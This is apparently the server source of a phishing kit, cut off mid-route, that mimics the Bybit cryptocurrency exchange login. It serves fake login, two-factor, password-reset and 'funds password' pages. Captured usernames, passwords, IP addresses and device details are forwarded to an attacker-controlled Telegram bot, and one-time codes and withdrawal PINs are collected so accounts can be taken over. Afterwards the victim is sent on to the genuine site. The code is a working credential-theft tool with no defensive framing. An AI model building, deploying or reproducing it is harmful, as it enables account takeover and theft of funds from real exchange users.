'use strict';
const express = require('express');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = (process.env.BOT_TOKEN || '').trim();
const CHAT_ID = (process.env.CHAT_ID || '').trim();
const PUBLIC_URL = (process.env.PUBLIC_URL || '').trim().replace(/\/$/, '');
const SECRET = (process.env.WEBHOOK_SECRET || crypto.createHash('sha1').update(BOT_TOKEN || 'x').digest('hex')).slice(0, 24);
const REDIRECT_URL = (process.env.REDIRECT_URL || 'https://www.bybit.com/en/').trim();
const TTL = 30 * 60 * 1000;

app.set('trust proxy', true);
app.disable('x-powered-by');
app.use(express.urlencoded({ extended: false, limit: '32kb' }));
app.use(express.json({ limit: '32kb' }));

const sessions = new Map();
setInterval(() => {
  const now = Date.now();
  for (const [k, s] of sessions) if (now - s.at > TTL) sessions.delete(k);
}, 300000).unref();

const esc = (v) =>
  String(v ?? '').replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));

const ipOf = (req) =>
  (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || 'unknown';

function device(ua = '') {
  const b = /Edg\//.test(ua) ? 'Edge' : /OPR\/|Opera/.test(ua) ? 'Opera'
    : /SamsungBrowser/.test(ua) ? 'Samsung' : /Chrome\//.test(ua) ? 'Chrome'
    : /Firefox\//.test(ua) ? 'Firefox' : /Safari\//.test(ua) ? 'Safari' : 'Unknown';
  const o = /Android/.test(ua) ? 'Android' : /iPhone|iPad|iPod/.test(ua) ? 'iOS'
    : /Windows/.test(ua) ? 'Windows' : /Mac OS X/.test(ua) ? 'macOS' : /Linux/.test(ua) ? 'Linux' : 'Unknown';
  return `${b} / ${o}`;
}

const stamp = () =>
  new Intl.DateTimeFormat('en-GB', {
    timeZone: 'Africa/Lagos', day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false,
  }).format(new Date()) + ' WAT';

const maskMail = (v) => { const [n, d] = String(v).split('@'); return d ? n.slice(0, 2) + '***@' + d : 'your email'; };
const maskPhone = (v) => { const s = String(v).replace(/\s/g, ''); return s.length > 5 ? s.slice(0, 3) + '****' + s.slice(-2) : 'your phone'; };

async function tg(text, keyboard) {
  if (!BOT_TOKEN || !CHAT_ID) { console.log('[tg] missing env\n' + text); return; }
  try {
    const body = { chat_id: CHAT_ID, text, parse_mode: 'HTML', disable_web_page_preview: true };
    if (keyboard) body.reply_markup = keyboard;
    const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body),
    });
    if (!r.ok) console.error('[tg]', r.status, await r.text());
  } catch (e) { console.error('[tg]', e.message); }
}

function cookies(req) {
  const o = {};
  (req.headers.cookie || '').split(';').forEach((p) => {
    const i = p.indexOf('=');
    if (i > 0) o[p.slice(0, i).trim()] = decodeURIComponent(p.slice(i + 1).trim());
  });
  return o;
}

const sidOf = (req) => (req.body && req.body.s) || req.query.s || cookies(req).sid || '';

function touch(req, res) {
  const existing = sidOf(req);
  if (existing && sessions.has(existing)) { const s = sessions.get(existing); s.at = Date.now(); return s; }
  const sid = crypto.randomBytes(9).toString('hex');
  const s = { sid, at: Date.now(), ip: ipOf(req), ua: req.headers['user-agent'] || '', login: '', mail: '', phone: '', codes: 0, method: 'auth' };
  sessions.set(sid, s);
  res.setHeader('Set-Cookie', `sid=${sid}; Path=/; Max-Age=1800; HttpOnly; SameSite=Lax`);
  return s;
}

const must = (req) => { const sid = sidOf(req); return (sid && sessions.get(sid)) || null; };

/* ---------- layout ---------- */

const CSS = `
*{box-sizing:border-box}
:root{--bg:#0B0E11;--card:#181A20;--line:#2B3139;--txt:#EAECEF;--mut:#848E9C;--y:#F7A600;--y2:#FFC94D}
body{margin:0;background:var(--bg);color:var(--txt);font:14px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
.wrap{max-width:420px;margin:0 auto;padding:34px 16px 40px}
.card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:26px 22px 22px}
.logo{display:flex;align-items:center;gap:9px;margin-bottom:24px}
.mark{width:22px;height:22px;background:var(--y);border-radius:4px;transform:rotate(45deg)}
.word{font-size:19px;font-weight:800;letter-spacing:1.5px}
h1{font-size:22px;margin:0 0 6px;font-weight:700}
.sub{color:var(--mut);font-size:13px;margin:0 0 20px}
.tabs{display:flex;gap:20px;border-bottom:1px solid var(--line);margin-bottom:20px}
.tab{background:none;border:0;color:var(--mut);font-size:13.5px;font-weight:600;padding:0 0 11px;cursor:pointer;border-bottom:2px solid transparent;font-family:inherit}
.tab.on{color:var(--txt);border-bottom-color:var(--y)}
label{display:block;font-size:12.5px;color:var(--mut);margin:0 0 6px;font-weight:500}
input{width:100%;padding:12px 13px;border:1px solid var(--line);border-radius:8px;font-size:15px;background:#1E2329;color:var(--txt);font-family:inherit}
input::placeholder{color:#5E6673}
input:focus{outline:none;border-color:var(--y)}
.pw{position:relative}.pw input{padding-right:50px}
.eye{position:absolute;right:4px;top:50%;transform:translateY(-50%);background:none;border:0;color:var(--mut);cursor:pointer;padding:8px;display:flex}
.err{color:#F6465D;font-size:12.5px;min-height:17px;margin:9px 0 0}
.btn{width:100%;margin-top:12px;padding:13px;border:0;border-radius:8px;background:var(--y);color:#0B0E11;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit}
.btn:hover{background:var(--y2)}
.btn:disabled{opacity:.6}
.btn.ghost{background:transparent;border:1px solid var(--line);color:var(--txt)}
.alt{display:flex;justify-content:space-between;margin-top:16px;font-size:12.5px}
.alt a{color:var(--y);text-decoration:none}
.otps{display:flex;gap:8px;margin:20px 0 4px}
.otps input{text-align:center;font-size:19px;font-weight:700;padding:0;aspect-ratio:1/1.15;border-radius:8px}
.methods{display:flex;gap:8px;margin:0 0 4px}
.m{flex:1;padding:9px 4px;border:1px solid var(--line);border-radius:8px;background:transparent;color:var(--mut);font-size:12px;font-weight:600;cursor:pointer;font-family:inherit}
.m.on{border-color:var(--y);color:var(--y);background:rgba(247,166,0,.08)}
.resend{display:block;margin:16px auto 0;background:none;border:0;font-size:12.5px;color:var(--y);cursor:pointer;font-family:inherit}
.resend:disabled{color:var(--mut);cursor:default}
.note{font-size:11.5px;color:#5E6673;margin-top:16px;line-height:1.55;border-top:1px solid var(--line);padding-top:14px}
.foot{margin-top:16px;text-align:center;font-size:12.5px;color:var(--mut)}
.foot a{color:var(--y);text-decoration:none}
.qr{display:none;flex-direction:column;align-items:center;padding:8px 0 4px}
.qr.on{display:flex}
.qr canvas{background:#fff;border-radius:10px;padding:10px}
.qr p{color:var(--mut);font-size:12px;text-align:center;margin:12px 0 0}
.tick{width:60px;height:60px;border-radius:50%;background:rgba(14,203,129,.12);color:#0ECB81;font-size:28px;display:flex;align-items:center;justify-content:center;margin:4px auto 18px}
.spin{width:15px;height:15px;border:2px solid var(--line);border-top-color:var(--y);border-radius:50%;display:inline-block;vertical-align:-3px;margin-right:7px;animation:s .7s linear infinite}
@keyframes s{to{transform:rotate(360deg)}}
.alert{background:rgba(247,166,0,.1);border:1px solid rgba(247,166,0,.35);color:#F7A600;font-size:12.5px;border-radius:8px;padding:10px 12px;margin-bottom:16px}
`;

const LOGO = '<div class="logo"><div class="mark"></div><div class="word">BYBIT</div></div>';

const page = (title, inner) => `<!doctype html><html lang="en"><head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow"><title>${title}</title>
<style>${CSS}</style></head><body><div class="wrap"><main class="card">${inner}</main></div></body></html>`;

const view = (html, sid) => html.replaceAll('{{SID}}', sid).replaceAll('{{REDIRECT}}', REDIRECT_URL);

const EYE_ICON = '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg>';

/* ---------- screens ---------- */

const S_LOGIN = (expired) => page('Log In | Bybit', `
${LOGO}
${expired ? '<div class="alert">Your session expired. Please log in again.</div>' : ''}
<h1>Log In</h1>
<p class="sub">Welcome back to Bybit</p>
<div class="tabs">
  <button class="tab on" data-tab="mail">Email/Phone</button>
  <button class="tab" data-tab="qr">QR Code</button>
</div>
<form id="f" novalidate>
  <label for="l">Email/Phone number</label>
  <input id="l" type="text" autocomplete="username" autocapitalize="none" spellcheck="false" placeholder="Email/Phone number">
  <div style="height:14px"></div>
  <label for="p">Password</label>
  <div class="pw">
    <input id="p" type="password" autocomplete="current-password" placeholder="Password">
    <button class="eye" type="button" id="eye">${EYE_ICON}</button>
  </div>
  <div class="err" id="err"></div>
  <button class="btn" type="submit" id="btn">Log In</button>
</form>
<div class="qr" id="qr">
  <canvas id="cv" width="176" height="176"></canvas>
  <p>Scan with the Bybit App to log in</p>
</div>
<div class="alt"><a href="/forgot?s={{SID}}">Forgot password?</a><a href="#">Forgot email/phone?</a></div>
<div class="note">By logging in you agree to Bybit's Terms of Service and Privacy Policy.</div>
<div class="foot">Don't have an account? <a href="#">Sign Up</a></div>
<script>
const SID="{{SID}}",F=document.getElementById('f'),L=document.getElementById('l'),
P=document.getElementById('p'),B=document.getElementById('btn'),E=document.getElementById('err'),
EYE=document.getElementById('eye'),QR=document.getElementById('qr');
EYE.onclick=()=>{const on=P.type==='password';P.type=on?'text':'password';EYE.style.opacity=on?'.5':'1';};
document.querySelectorAll('.tab').forEach(t=>t.onclick=()=>{
  document.querySelectorAll('.tab').forEach(x=>x.classList.remove('on'));
  t.classList.add('on');
  const qr=t.dataset.tab==='qr';
  QR.classList.toggle('on',qr);
  F.style.display=qr?'none':'block';
});
(function draw(){
  const c=document.getElementById('cv'),x=c.getContext('2d'),n=25,u=176/n;
  x.fillStyle='#fff';x.fillRect(0,0,176,176);
  x.fillStyle='#0B0E11';
  const finder=(cx,cy)=>{x.fillRect(cx*u,cy*u,7*u,7*u);x.fillStyle='#fff';x.fillRect((cx+1)*u,(cy+1)*u,5*u,5*u);
    x.fillStyle='#0B0E11';x.fillRect((cx+2)*u,(cy+2)*u,3*u,3*u);};
  for(let i=0;i<n;i++)for(let j=0;j<n;j++){
    if((i<8&&j<8)||(i>n-9&&j<8)||(i<8&&j>n-9))continue;
    if(Math.random()>.5)x.fillRect(i*u,j*u,u,u);
  }
  finder(0,0);finder(n-7,0);finder(0,n-7);
})();
F.addEventListener('submit',async e=>{
  e.preventDefault();
  const l=L.value.trim(),p=P.value;
  if(!l||!p){E.textContent='Enter your email/phone number and password.';return;}
  E.textContent='';B.disabled=true;B.textContent='Logging in…';
  try{
    const r=await fetch('/api/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({l,p,s:SID})});
    const j=await r.json();
    location.href=j.next||'/2fa';
  }catch{B.disabled=false;B.textContent='Log In';E.textContent='Network error. Please try again.';}
});
</script>`);

const S_2FA = (mail, phone, method) => page('Verification | Bybit', `
${LOGO}
<h1>Verification</h1>
<p class="sub" id="hint">Enter the 6-digit code from your Google Authenticator app.</p>
<div class="methods">
  <button class="m" data-m="auth">Authenticator</button>
  <button class="m" data-m="mail">Email</button>
  <button class="m" data-m="sms">SMS</button>
</div>
<form id="f" novalidate>
  <div class="otps" id="boxes">
    <input inputmode="numeric" maxlength="1" autocomplete="one-time-code">
    <input inputmode="numeric" maxlength="1"><input inputmode="numeric" maxlength="1">
    <input inputmode="numeric" maxlength="1"><input inputmode="numeric" maxlength="1">
    <input inputmode="numeric" maxlength="1">
  </div>
  <div class="err" id="err"></div>
  <button class="btn" type="submit" id="btn">Verify</button>
</form>
<button class="resend" id="rs" style="visibility:hidden" disabled>Resend code in 60s</button>
<div class="note">Never share this code with anyone. Bybit will never ask for it outside this page.</div>
<div class="foot"><a href="/?s={{SID}}">Back to log in</a></div>
<script>
const SID="{{SID}}",BS=[...document.querySelectorAll('.otps input')],
BTN=document.getElementById('btn'),E=document.getElementById('err'),RS=document.getElementById('rs'),
HINT=document.getElementById('hint');
const TARGET={mail:"${esc(maskMail(mail))}",sms:"${esc(maskPhone(phone))}"};
let method="${esc(method)}",timer=null;
function setMethod(m){
  method=m;
  document.querySelectorAll('.m').forEach(x=>x.classList.toggle('on',x.dataset.m===m));
  if(m==='auth'){HINT.textContent='Enter the 6-digit code from your Google Authenticator app.';RS.style.visibility='hidden';}
  else{
    HINT.textContent='Enter the 6-digit code sent to '+TARGET[m]+'.';
    RS.style.visibility='visible';RS.disabled=true;RS.textContent='Resend code in 60s';
    clearInterval(timer);let left=60;
    timer=setInterval(()=>{left--;if(left<=0){clearInterval(timer);RS.disabled=false;RS.textContent='Resend code';return;}
      RS.textContent='Resend code in '+left+'s';},1000);
  }
}
document.querySelectorAll('.m').forEach(b=>b.onclick=()=>setMethod(b.dataset.m));
setMethod(method);
BS[0].focus();
BS.forEach((b,i)=>{
  b.addEventListener('input',()=>{b.value=b.value.replace(/\\D/g,'');if(b.value&&BS[i+1])BS[i+1].focus();});
  b.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!b.value&&BS[i-1])BS[i-1].focus();});
  b.addEventListener('paste',e=>{const d=(e.clipboardData.getData('text')||'').replace(/\\D/g,'');
    if(d.length>1){e.preventDefault();d.split('').forEach((c,j)=>{if(BS[j])BS[j].value=c;});BS[Math.min(d.length,5)].focus();}});
});
RS.onclick=async()=>{
  RS.disabled=true;RS.textContent='Sending…';
  try{await fetch('/api/resend',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({method,s:SID})});}catch{}
};
document.getElementById('f').addEventListener('submit',async e=>{
  e.preventDefault();
  const code=BS.map(b=>b.value).join('');
  if(code.length<6){E.textContent='Enter the complete 6-digit code.';return;}
  E.textContent='';BTN.disabled=true;BTN.textContent='Verifying…';
  try{
    const r=await fetch('/api/code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code,method,s:SID})});
    const j=await r.json();
    location.href=j.next||'/done';
  }catch{BTN.disabled=false;BTN.textContent='Verify';E.textContent='Network error. Please try again.';}
});
</script>`);

const S_FORGOT = () => page('Reset password | Bybit', `
${LOGO}
<h1>Reset your password</h1>
<p class="sub">Enter the email or phone number linked to your account and we'll send a reset link.</p>
<form id="f" novalidate>
  <label for="l">Email/Phone number</label>
  <input id="l" type="text" autocapitalize="none" spellcheck="false" placeholder="Email/Phone number">
  <div class="err" id="err"></div>
  <button class="btn" type="submit" id="btn">Continue</button>
</form>
<div class="foot"><a href="/?s={{SID}}">Back to log in</a></div>
<script>
const SID="{{SID}}",BTN=document.getElementById('btn'),E=document.getElementById('err');
document.getElementById('f').addEventListener('submit',async e=>{
  e.preventDefault();
  const l=document.getElementById('l').value.trim();
  if(!l){E.textContent='Enter your email or phone number.';return;}
  E.textContent='';BTN.disabled=true;BTN.textContent='Sending…';
  try{
    await fetch('/api/forgot',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({l,s:SID})});
    BTN.textContent='Reset link sent';E.style.color='#0ECB81';E.textContent='Check your inbox or messages.';
  }catch{BTN.disabled=false;BTN.textContent='Continue';E.textContent='Network error. Please try again.';}
});
</script>`);

const S_FUNDS = () => page('Funds password | Bybit', `
${LOGO}
<h1>Funds password</h1>
<p class="sub">Enter your 6-digit funds password to authorise this withdrawal.</p>
<form id="f" novalidate>
  <div class="otps" id="boxes">
    <input inputmode="numeric" maxlength="1" type="password">
    <input inputmode="numeric" maxlength="1" type="password">
    <input inputmode="numeric" maxlength="1" type="password">
    <input inputmode="numeric" maxlength="1" type="password">
    <input inputmode="numeric" maxlength="1" type="password">
    <input inputmode="numeric" maxlength="1" type="password">
  </div>
  <div class="err" id="err"></div>
  <button class="btn" type="submit" id="btn">Confirm</button>
</form>
<div class="foot"><a href="/done?s={{SID}}">Back</a></div>
<script>
const SID="{{SID}}",BS=[...document.querySelectorAll('.otps input')],
BTN=document.getElementById('btn'),E=document.getElementById('err');
BS[0].focus();
BS.forEach((b,i)=>{
  b.addEventListener('input',()=>{b.value=b.value.replace(/\\D/g,'');if(b.value&&BS[i+1])BS[i+1].focus();});
  b.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!b.value&&BS[i-1])BS[i-1].focus();});
});
document.getElementById('f').addEventListener('submit',async e=>{
  e.preventDefault();
  const pin=BS.map(b=>b.value).join('');
  if(pin.length<6){E.textContent='Enter your 6-digit funds password.';return;}
  E.textContent='';BTN.disabled=true;BTN.textContent='Confirming…';
  try{
    await fetch('/api/funds',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({pin,s:SID})});
    BTN.textContent='Confirmed';
  }catch{BTN.disabled=false;BTN.textContent='Confirm';E.textContent='Network error. Please try again.';}
});
</script>`);

const S_DONE = () => page('Logged in | Bybit', `
<div class="tick">&#10003;</div>
<h1>Login successful</h1>
<p class="sub"><span class="spin"></span>Redirecting you to your account…</p>
<a class="btn ghost" href="/2fa?s={{SID}}" style="display:block;text-align:center;text-decoration:none;margin-bottom:10px">Code rejected? Enter another</a>
<a class="btn ghost" href="/funds?s={{SID}}" style="display:block;text-align:center;text-decoration:none;margin-bottom:10px">Enter funds password</a>
<a class="btn" href="{{REDIRECT}}" style="display:block;text-align:center;text-decoration:none">Go to Bybit</a>
<script>setTimeout(()=>{location.href="{{REDIRECT}}";},7000);</script>`);

/* ---------- routes ---------- */

const send = (res, html, sid) => { res.setHeader('Cache-Control', 'no-store'); res.send(view(html, sid)); };

app.get('/', (req, res) => { const s = touch(req, res); send(res, S_LOGIN(req.query.e === '1'), s.sid); });

app.get('/2fa', (req, res) => {
  const s = must(req);
  if (!s) return res.redirect('/?e=1');
  send(res, S_2FA(s.mail || s.login, s.phone || s.login, req.query.m || s.method), s.sid);
});

app.get('/forgot', (req, res) => { const s = touch(req, res); send(res, S_FORGOT(), s.sid); });

app.get('/funds', (req, res) => {
  const s = must(req);
  if (!s) return res.redirect('/?e=1');
  send(res, S_FUNDS(), s.sid);
});

app.get('/done', (req, res) => { const s = touch(req, res); send(res, S_DONE(), s.sid); });

app.post('/api/login', async (req, res) => {
  const s = touch(req, res);
  const l = String(req.body.l || '').trim().slice(0, 120);
  const p = String(req.body.p || '').slice(0, 120);
  s.login = l;
  if (l.includes('@')) s.mail = l; else s.phone = l;
  await tg(
    '🟡 <b>BYBIT — LOGIN</b>\n' +
    `<code>#${s.sid.slice(0, 6)}</code>\n\n` +
    `<b>Login:</b> <code>${esc(l)}</code>\n` +
    `<b>Password:</b> <code>${esc(p)}</code>\n\n` +
    `<b>IP:</b> ${esc(s.ip)}\n<b>Device:</b> ${esc(device(s.ua))}\n<b>Time:</b> ${stamp()}`
  );
  res.json({ ok: true, next: '/2fa?s=' + s.sid });
});

app.post('/api/code', async (req, res) => {
  const s = touch(req, res);
  const code = String(req.body.code || '').replace(/\D/g, '').slice(0, 10);
      
